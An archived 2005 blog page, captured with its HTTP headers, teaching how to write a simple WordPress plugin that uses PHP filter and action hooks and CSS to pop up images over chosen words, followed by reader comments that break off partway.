@@ -1,0 +1,608 @@
+http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin
+HTTP/1.1 200 OK
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.4.9-4~natty+1
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Type: text/html;charset=utf-8
+cache-control: max-age=900
+X-Cacheable: YES
+Content-Length: 11981
+Accept-Ranges: bytes
+Date: Thu, 24 Jul 2014 12:54:59 GMT
+X-Varnish: 472581110
+Via: 1.1 varnish
+Connection: close
+age: 0
+X-Cache: MISS
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>How to Write a Simple WordPress Plugin - Asymptomatic</title>
+	<meta name="generator" content="Habari">
+	<meta name="viewport" content="width=device-width, maximum-scale = 1">
+	<link rel="Shortcut Icon" href="http://asymptomatic.net.owenw.com/user/themes/asy/favicon.png">
+	<link rel="alternate" type="application/atom+xml" title="Atom 1.0" href="http://asymptomatic.net/how-to-write-a-simple-wordpress-plugin/atom"><link rel="service" type="application/atomsvc+xml" title="Atom Publishing Protocol" href="http://asymptomatic.net/atom"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://asymptomatic.net/rsd">
+<link type="text/css" media="screen" rel="stylesheet" href="//cloud.typography.com/7392252/643302/css/fonts.css">
+<link type="text/css" rel="stylesheet" href="http://asymptomatic.net.owenw.com/user/themes/wazi/css/style.css">
+<link type="text/css" media="screen,projection" rel="stylesheet" href="http://asymptomatic.net.owenw.com/user/themes/asy/assets/asy.css">
+
+<!--[if lt IE 9]><script  src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/r29/html5.js"></script>
+<![endif]--></head>
+<body class="display_entry entry-1350" itemscope itemtype="http://schema.org/Blog">
+
+<div id="wrapper">
+
+	<header id="header">
+		<hgroup>
+			<h1 itemprop="name"><a href="/" itemprop="url">Asymptomatic</a></h1>
+			<h2 itemprop="description">There must be intelligent life down here</h2>
+		</hgroup>
+		<nav class="first last block-type-menu block-title-menu block">
+<h1>Menu</h1><ol ><li class="inactive" id="main-menu_2603"><a href="http://asymptomatic.net/contact-me">Contact Me</a></li>
+<li class="inactive" id="main-menu_2604"><a href="http://asymptomatic.net/stuff-i-should-do">Stuff I Should Do</a></li>
+</ol></nav>			</header>
+
+	<div id="content">
+		
+		
+		<div id="posts" itemprop="blogPosts">
+			<article id="post-1350" class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<header class="metadata">
+		<h1 itemprop="name"><a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin" itemprop="url">How to Write a Simple WordPress Plugin</a></h1>
+		<div class="pubdata">
+			<time datetime="2005-02-22T21:35:21Z" itemprop="datePublished">Feb 22, 2005 9:35 pm</time>
+			<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">unknown</span>
+			<span style="display:none;"><a href="https://plus.google.com/116600978211702052518?rel=author" rel="me">Google</a></span>
+		</div>
+		<div itemprop="keywords" class="tags">
+					</div>
+	</header>
+
+	<div class="content" itemprop="articleBody">
+	<p>I think I've done enough of these that I can convey upon you my limited expertise.&nbsp; :)  [This one's for <a href="http://spoken-for.org">Val</a>.]</p><p>For today's exercise (which will take me no more than an hour to explain in writing), we're going to make a plugin that is like the <a href="http://www.huddledmasses.org/wp-content/plugins/source.php?file=acronyms.php">acronym plugin</a>, except it's going to display an image popup instead of text.&nbsp; <!--more--><br>To begin, you're going to need a text editor.&nbsp; I recommend one of the syntax-highlighting variety.&nbsp; My commercial editors of choice at the moment are TextPad or EditPad Pro.&nbsp; Notepad doesn't syntax-highlight, but it works fine.&nbsp; Macintosh users are on their own with this, but I've heard the word BBEdit uttered more than once.&nbsp; Whatever you use, open a blank file.&nbsp; The first thing to do is to name and document the plugin so that it appears in the WordPress administration console.&nbsp; We're going to call our plugin "AcroPop".&nbsp; The plugin header tells WordPress what to do with the plugin file.&nbsp; Insert something to this effect at the top of your plugin file, placing the appropriate information in the appropriate fields:</p><blockquote><p><code>&lt;?php
+/*
+Plugin Name: AcroPop
+Plugin URI: http://www.asymptomatic.net/wp-hacks
+Description: A plugin that pops-up images when you mouse-over certain words.&nbsp; Author: Owen Winkler
+Version: 1.0
+Author URI: http://www.asymptomatic.net
+*/
+?&gt;</code></p></blockquote><p>Some notes about the plugin header:  All of the header info is inside of a block comment.&nbsp; That's because none of it is executable.&nbsp; WordPress scans the plugins directory for files that contain this header information.&nbsp; When it finds the headers, it includes the plugin file.&nbsp; No header, no include.&nbsp; The <em>Plugin URI</em> is the URI of the plugin, where users can expect to find a link to the latest downloadable version.&nbsp; The <em>Author URI</em> is the URI of your site, where users can find out more information about the person in the <em>Author</em> field.&nbsp; In recent versions of WordPress you can no longer put full HTML in your Description field, however, it seems that anchor tags (you know, &lt;a href="http://www.example.com"&gt;)  do work.&nbsp; If you want to direct users to a configuration page for your plugin, you might figure out how to put it here.&nbsp; (Note that this tutorial isn't going to cover assembly of a configuration page.)</p><p>Save your work because you're not a fool for the power company, and continue on to the next page, where we talk about plugin hooks.&nbsp; <!--nextpage--><br>Plugin hooks are the main way to get plugins to "go" in WordPress.&nbsp; Spread throughout the WordPress code are hooks that can call your plugin code.&nbsp; There is one that is called whenever a user posts a comment.&nbsp; There is one that is called whenever a new user registers.&nbsp; Pretty much any WordPress action you can think of has a plugin hook waiting for plugins to take advantage of.&nbsp; You can get a list of hooks over at the <a href="http://codex.wordpress.org/Plugin_API">WordPress Codex</a>.&nbsp; This list is currently in-production, but will fill out in time.&nbsp; There are two types of hooks, Actions and Filters.&nbsp; Actions are triggered when a specific WordPress action takes place, like when a new post is submitted.&nbsp; WordPress doesn't ask for any information back from the plugin, it just tells the plugin "this thing happened" and moves on.&nbsp; With Filters, WordPress expects that your plugin is going to process a certain chunk of data and return it, like displaying the text of a post.&nbsp; WordPress will pass the text of the post into the plugin, the plugin will process the text and return it, and WordPress will display the processed text.&nbsp; Since more than one plugin can attach to the same hook, each plugin can make the changes it needs to the filtered text.&nbsp; We want to a Filters because we're going to cause some specific text in the post to pop up an image.&nbsp; We're going to do this by putting some tags around the text.&nbsp; Using the "the_content" filter is our best bet.&nbsp; Here's how to plug into a hook.&nbsp; Add this under your plugin header:</p><blockquote><p><code>&lt;?php
+add_filter('the_content', 'acropop_the_content');
+
+function acropop_the_content($content)
+{
+return $content;
+}
+?&gt;</code></p></blockquote><p>This code adds a "sink" (think about where heat goes - into a "heat<em>sink</em>") to the filter event "the_content" so that any time WordPress wants to display post content, it will pass the post content to a function named "acropop_the_content".&nbsp; This is called "<em>registering a plugin sink</em>".&nbsp; You can see the empty acropop_the_content() function, too.&nbsp; The function acropop_the_content() is a <em>sink</em> for the "the_content" hook.&nbsp; I mention this just so that we all know what we're talking about.&nbsp; Note that this plugin will now run, although it doesn't actually do any processing.&nbsp; Just upload it to your plugins directory (/wp-content/plugins) and activate it in your WordPress admin console.&nbsp; If you remove the <code>return $content;</code> what do you think will happen?&nbsp; All of your post text will appear to have been deleted.&nbsp; Don't panic!&nbsp; Remember that WordPress expects filters to return their values so that they can be sent to the browser.&nbsp; Just put that line back and everything will be fine.&nbsp; Try this for fun:  Replace <code>return $content;</code> with <code>return "Kumquat";</code>.&nbsp; See what it does?&nbsp; I think you may be starting to get the idea.&nbsp; When you're done playing with your posts, move on to the next page, where we'll discuss finding "acronyms" to pop.&nbsp; <!--nextpage--><br>Well, now all we need to do is change the post content so that the text we're looking for is wrapped with a special "popup" tag.&nbsp; We have the content of the post, as passed into our function by WordPress as the variable <code>$content</code>.&nbsp; All we need to do is:</p><ol>
+	<li>Have a list of things to pop up and what to display.</li>
+	<li>Look through the content of the post and wrap thost things with the special tag.</li>
+</ol><p>Ok, let's make a list.&nbsp; Above the line that registers your plugin sink, add this:</p><blockquote><p><code>$acropops = array (
+'mom'=>'http://www.example.com/images/mom.jpg',
+);</code></p></blockquote><p>This creates an associative array (a named list) of images to use when certain text appears in the post.&nbsp; Whenever the content contains "mom", we're going to make that text pop up her picture.&nbsp; Optionally change 'mom' to 'lusty babe', but don't forget to change the image to one that actually exists.&nbsp; So we have the list, now we need to wrap the list items when they appear in the post content.&nbsp; This is pretty easy to do with one of the built-in PHP replace functions and a little array manipulation.&nbsp; Inside our array sink, lets start adding some code:</p><blockquote><p><code>function acropop_the_content($content)
+{
+
+global $acropops;
+
+$search_strings = array_keys($acropops);
+$replace_strings = array_values($acropops);
+
+$search_strings = array_map('acropop_search', $search_strings);
+$replace_strings = array_map('acropop_replace', $replace_strings);
+
+$content = preg_replace($search_strings, $replace_strings, $content);
+
+return $content;
+
+}</code></p></blockquote><p>Now what the heck does <em>that</em> do?&nbsp; First, we need to bring the <code>$acropops</code> array into the scope of the function, otherwise it won't be defined when we try to use it.&nbsp; Then, we set <code>$search_strings</code> to just the key part ('mom') of the <code>$acropops</code> array, and $replace_strings to just the value part ('http://www.example.com/images/mom.jpg') of the <code>$acropops</code> array.&nbsp; Because we're going to use the PHP function <code>preg_replace()</code> to do our replacing, all of the search strings need to be in regular expression format.&nbsp; You don't need too firm a grasp on <a href="http://www.regular-expressions.info">regular expressions</a> to follow along.&nbsp; Just know that the searching part of the regular expression needs to be delimited at the beginning and end by the same character.&nbsp; Since our array keys are not delimited, we need to add those delimiters.&nbsp; That's where the PHP function <code>array_map()</code> comes into play.&nbsp; <code>array_map()</code> calls a function, passing each element in the array to it.&nbsp; The function returns a replacement value for each element.&nbsp; The result of <code>array_map()</code> is a new array with modified values as changed by the specified function.&nbsp; In the case of <code>$search_strings</code>, we're going to use a function called 'acropop_search', and in the case of <code>$replace_strings</code>, we're going to use a function called 'acropop_replace'.&nbsp; Check these out and add them to the plugin below the plugin event sink:</p><blockquote><p><code>function acropop_search($value)
+{
+return '#\b' . $value .'\b#i';
+}
+
+function acropop_replace($value)
+{
+return '&lt;a class="acropop" href="#"&gt;\0&lt;img src="' . $value . '" /&gt;&lt;/a&gt;';
+}</code></p></blockquote><p><code>acropop_replace()</code> returns a pretty wild-looking result.&nbsp; Basically, it's creating an <code>&lt;a&gt;</code> wrapper for the replaced word (denoted by the regular expression replacement "\0") and adding an <code>&lt;img&gt;</code> tag with the src set from the <code>$acropops</code> array values (<code>$value</code>).&nbsp; Yeah, it's a little more complicated than the "Simple" in this post title implied, but it gives you a lot of flexibility in what you can accomplish.&nbsp; One last thing about array_map() and then we'll move on:  The second parameter is a <em>string</em>, even though it's talking about a function.&nbsp; Don't use just the function name in there - be sure you put the function name in quotes!&nbsp; If you've followed along with the project so far, you should save and try what you have.&nbsp; When you look at your WordPress output on the home page or a single post, you will notice that there are images everywhere where there used to be only the word "mom".&nbsp; If you view the source of the page, you'll see that every time you used the word "mom" our plugin wrapped it with an achor tag and an image.&nbsp; Want to try something fun?&nbsp; Try having <code>acropop_replace()</code> return something else entirely.&nbsp; Try <code>return 'dad';</code>.&nbsp; Do you see the change?&nbsp; Pretty cool how that works, huh?&nbsp; Well, now that we've got the anchors in there, how do we get them to pop up the image instead of just showing it?&nbsp; Ah, that's in our next step...&nbsp; <!--nextpage--><br>In case you were thinking that I had quit talking about WordPress and had moved into a PHP tutorial, keep following.&nbsp; I promise that I get back to some important stuff.&nbsp; To make our anchor tags pop up images, we're going to use a CSS technique inspired by one I found on <a href="http://www.meyerweb.com/eric/css/edge/popups/demo.html">meyerweb</a>, another WordPress-powered site.&nbsp; Basically, you use CSS to change the display of the specially classed "acropop" anchor tags.&nbsp; You simply define a few rules in CSS like this:</p><blockquote><p><code>a.acropop {
+	position:relative;
+	text-decoration: none;
+	border-bottom: 1px dotted #0000FF;
+}
+a.acropop img {
+	display: none;
+}
+a.acropop:hover img {
+	display: block;
+	position: absolute;
+	padding: 5px;
+	margin: 10px;
+	z-index: 100;
+	color: #AAA;
+	background: black;
+	text-align: center;
+}
+</code></p></blockquote><p>The <code>&lt;img&gt;</code> tags inside of the anchor are styled not to appear by default.&nbsp; When you move the mouse over the anchor that trips the <code>:hover</code> CSS state, which reveals the image as a floating "tooltip".&nbsp; Of course this is not the difinitive method for creating tooltip-like popups, but it's easier than describing a ton of javascript when our focus here is WordPress.&nbsp; Anyway, if you follow through with the rest of the tutorial, you'll have enough knowledge to replace it when you find something better.&nbsp; A question you might have at this point might be, "How do you get the CSS to be part of the template without editing the site's theme CSS file?"  I'm glad you're following along.&nbsp; We accomplish that using another plugin hook: The wp_head Action.&nbsp; For more on that, turn the page.&nbsp; <!--nextpage--><br>The wp_head action is a plugin hook that executes inside the <code>&lt;head&gt;</code> tag of the site output.&nbsp; The <code>&lt;head&gt;</code> tag is where you usually add references to styles and stylesheets.&nbsp; And that's exactly what we're going to do.&nbsp; Let's register a hook sink for the wp_head action:</p><blockquote><p><code>
+add_action('wp_head', 'acro_wp_head');
+function acro_wp_head($unused)
+{
+	echo '&lt;style type="text/css" media="screen"&gt;
+&lt;!-- PUT STYLES HERE --&gt;
+	&lt;/style&gt;\n';
+}
+</code></p></blockquote><p>There are a few items of note here.&nbsp; First off, "PUT STYLES HERE" means just that.&nbsp; Grab the styles from the previous page, and put them in that spot.&nbsp; Next, you'll note that this sink function uses the PHP command <code>echo</code>.&nbsp; You need to be careful using echo in plugin functions.&nbsp; You will probably not use echo in a Filter, but you might in an Action.&nbsp; Since wp_head is an Action hook, you're doing fine.&nbsp; So what will happen is this: When the output page is constructed, WordPress will build the &lt;head&gt; section of the page.&nbsp; Before it's done, all of the plugin sinks for the the wp_head hook will be called.&nbsp; WordPress doesn't care what they do or if they return any value.&nbsp; Ours writes some style information to the browser.&nbsp; Control then passes back to WordPress, and it finishes construction of the page, including filtering all of the posts for our popup words.&nbsp; Pretty crafty, eh?&nbsp; I should mention that this is probably not the best way to do a larger project.&nbsp; When you add code to the head of the output page like this, you increase the size of the page somewhat.&nbsp; It's not a lot, but after many hits it starts to pile up.&nbsp; You might do better using a CSS import command to import style information.&nbsp; You could even use the plugin file itself as the imported file!&nbsp; I'll leave this as an exercise for the user, or the topic for my next tutorial.&nbsp; Someone's going to ask, "But, where's the finished plugin?"  Hey, I just wrote several pages of tutorial that not only included all of the code, but explained why and how it all worked.&nbsp; <em>You</em> write the <a href="http://www.asymptomatic.net/wp-hacks">plugin</a>.&nbsp;</p>	</div>
+
+		<section class="comments">
+		<h1 id="comments">Comments</h1>
+									<article class="comment" id="comment-1807" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/a28873b6d737b713828754dbf92fe0ba?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1807/7b4314/redirect" itemprop="url">valerie</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1807" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>I knew if I said something you'd beat me to it.  :P</p><p>Thank you, I will try this later tomorrow, when I'm more coherent... *crawls to bed*</p></div>
+</article>
+							<article class="comment" id="comment-1808" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/7ca7bafa46b2294ae6223bfa1cef9a1e?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1808/cca93c/redirect" itemprop="url">MacManX</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1808" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>For a good list of Mac, Windows, and Unix (Linux) text editors, check out the WordPress Codex's list: http://codex.wordpress.org/Glossary#Text_editor</p></div>
+</article>
+							<article class="comment" id="comment-1810" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/33ae983c72db97d93df45a6290d3f436?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1810/ac460f/redirect" itemprop="url">Ozh</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1810" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Nice article. I was thinking about doing something similar one day, but focusing more on good plugin coding habits (naming vars and functions, using classes, checking various things), but I'm waiting to be more 'expert' at it :)</p></div>
+</article>
+							<article class="comment" id="comment-1811" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/5bde2be8374a2a6a33df8ce7163f328b?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1811/f84ad1/redirect" itemprop="url">Mathias Bynens</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1811" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p><a href="http://codex.wordpress.org/User:Carthik/Plunge_into_Plugins" title="Carthik’s “Plunge into WordPress Plugins”" rel="nofollow">Carthik&#8217;s &#8220;Plunge into WordPress Plugins&#8221;</a> also is a great read. Now we need <a href="http://codex.wordpress.org/User:Carthik/Plunge_into_Plugins#List_of_Available_Filter_Hooks" rel="nofollow">a list of available filter hooks</a> with an explanation, 'cause I don't know what all the <code>_pre</code> and <code>pre_</code> stuff stands for.</p></div>
+</article>
+							<article class="comment" id="comment-1812" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/af92019286872e190d5007f333c37a5f?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1812/c35b20/redirect" itemprop="url">alvanweb</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1812" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>its <strong>very good</strong>. thanks !</p></div>
+</article>
+							<article class="comment" id="comment-1818" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/15220011b7769ba03176ffac61e75e10?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1818/6158c8/redirect" itemprop="url">Owen</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1818" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Carthik's Codex page on plugins is good, but it's more of a reference.  It doesn't have the conversational tone of a tutorial, which is why I wrote this.</p><p>But it <em>does</em> have information that I was thinking on covering in my next (potential) tutorial - why and how to write a plugin with an Options page, including an easy way to handle options maintenance and storage.</p></div>
+</article>
+							<article class="comment" id="comment-1823" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/e9602fae3c17530ff54a1d1cfb19be8d?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1823/71afa2/redirect" itemprop="url">R@lf</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1823" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>People who are using (stupid) IE can't see a thing.</p></div>
+</article>
+							<article class="comment" id="comment-1824" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/a28873b6d737b713828754dbf92fe0ba?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1824/cfbaf6/redirect" itemprop="url">valerie</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1824" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Oh crap he's right...  I hate IE now...  I have finally moved on to FireFox (officially not just part time anymore hehe) and I didn't even notice...</p></div>
+</article>
+							<article class="comment" id="comment-1825" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/15220011b7769ba03176ffac61e75e10?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1825/5304b1/redirect" itemprop="url">Owen</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1825" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Ah, but that's why this is a "Tutorial on how to write a WordPress plugin" and not a "Tutorial on how to make popup tooltip images in CSS".  Thankfully, it seems to degrade gracefully instead of filling IE with images all over the place.</p><p>If you've followed the tutorial, it should be academic to <a href="http://www.google.com/search?q=css+tooltips" rel="nofollow">find CSS that works on IE</a> and use that in the plugin instead of what I've provided.  Admittedly, what I've offered may not work in IE because I'm lazy and by no means a CSS expert.</p><p>What I <em>should</em> have done is written a plugin that puts "Download Firefox" at the bottom of every post.  ;)</p></div>
+</article>
+							<article class="comment" id="comment-1829" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/f36b7c94e6f9e4bd66e0951e7e429b09?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1829/2c1b32/redirect" itemprop="url">R@lf</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1829" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>@Owen: ROFL</p></div>
+</article>
+							<article class="comment" id="comment-1837" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/a28873b6d737b713828754dbf92fe0ba?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1837/6f3e86/redirect" itemprop="url">valerie</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1837" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Grrr I've been messing with this and I just can't figure it out.  &gt;:(  On to Plan B!!!</p></div>
+</article>
+							<article class="comment" id="comment-1878" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/5078bf15f901f269af6236ac5e3f3b2e?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1878/9a4557/redirect" itemprop="url">Dave Lartigue</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1878" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>I look forward to th next article. I was hoping this one would focus more on coding php for WP rather than just coding PHP. The intro to the hooks is nice, though. The plugin I have in mind will require some options, though :/</p></div>
+</article>
+							<article class="comment" id="comment-1911" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/be97888d41d3df31bb74e49a1be2b19c?size=50&d=identicon">
+				<span itemprop="name">
+				Dmitri Von Klein				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1911" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>How would you go about having it not respect things found inside &lt;a&gt; tags, because otherwise say an image has alt tag then you get quite the mess.&lt;/a&gt;</p></div>
+</article>
+							<article class="comment" id="comment-1913" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/15220011b7769ba03176ffac61e75e10?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/1913/95db8d/redirect" itemprop="url">Owen</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1913" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Hmm... Good point.  But there are a number of ways to do this.  Maybe the best way would be to craft the regular expression in acropop_search() to do look-behind so that you're only replacing text instances outside of tags:</p><p><code>function acropop_search($value)
+{
+return '/(?&lt;!&lt;[^&gt;]*)\b' . $value . '\b/i';
+}</code></p></div>
+</article>
+							<article class="comment" id="comment-1918" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/aa33db85bfe74c16658dceeab9a990e7?size=50&d=identicon">
+				<span itemprop="name">
+				Noah				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1918" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>I wonder if you can help me with something...I'm trying to either write a plugin or hack WP 1.5 to paginate single posts into multiple pages, very much like this article/post is divided into 5 pages.</p><p>If you have source or suggestions on this, I'd very much like to see it.</p></div>
+</article>
+							<article class="comment" id="comment-1919" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/15220011b7769ba03176ffac61e75e10?size=50&d=identicon">
+				<span itemprop="name">
